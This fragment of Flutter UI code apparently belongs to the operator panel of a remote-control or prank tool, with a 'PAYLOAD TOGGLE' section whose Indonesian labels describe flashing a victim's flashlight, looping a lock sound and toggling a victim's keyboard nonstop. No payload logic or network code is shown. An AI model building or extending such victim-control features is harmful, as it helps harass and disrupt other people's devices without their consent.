        ...
        Expanded(
          child: SingleChildScrollView(
            ...
            child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
              ...
              // Toggle Payloads
              _buildSectionHeader('PAYLOAD TOGGLE', _blue, '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="3"/><path d="M19.07 4.93a10 10 0 0 1 0 14.14M4.93 4.93a10 10 0 0 0 0 14.14"/></svg>'),
              const SizedBox(height: 10),
              _buildToggleCard('Senter', 'Senter victim on/off terus-menerus', _gold,
              ...
              const SizedBox(height: 8),
              _buildToggleCard('Suara', 'Putar assets/sound/lock.mp3 terus-menerus', _red,
              ...
              const SizedBox(height: 8),
              _buildToggleCard('Keyboard', 'Keyboard victim naik turun terus-menerus', _purple,
